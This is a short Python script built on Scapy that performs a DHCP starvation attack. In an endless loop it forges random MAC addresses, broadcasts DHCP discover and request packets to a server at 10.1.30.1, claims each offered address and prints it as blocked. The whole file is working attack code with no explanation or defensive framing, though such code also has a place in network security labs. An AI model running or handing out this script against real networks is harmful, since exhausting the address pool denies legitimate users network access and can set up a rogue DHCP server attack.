from scapy.all import *
import random

while True:
    mac = "aa:bb:cc:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
    xid = random.randint(1, 0xFFFFFFFF)
    
    d = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
         BOOTP(op=1, xid=xid, chaddr=bytes.fromhex(mac.replace(":",""))) /
         DHCP(options=[("message-type","discover"),"end"]))
    
    sendp(d, iface="eth0", verbose=False)
    r = sniff(iface="eth0", filter="udp and port 68", count=1, timeout=3)
    
    if r and DHCP in r[0] and r[0][BOOTP].xid == xid:
        ip = r[0][BOOTP].yiaddr
        req = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(op=1, xid=xid, chaddr=bytes.fromhex(mac.replace(":",""))) /
               DHCP(options=[("message-type","request"),("server_id","10.1.30.1"),("requested_addr",ip),"end"]))
        sendp(req, iface="eth0", verbose=False)
        print(f"ip bloquee : {ip}")
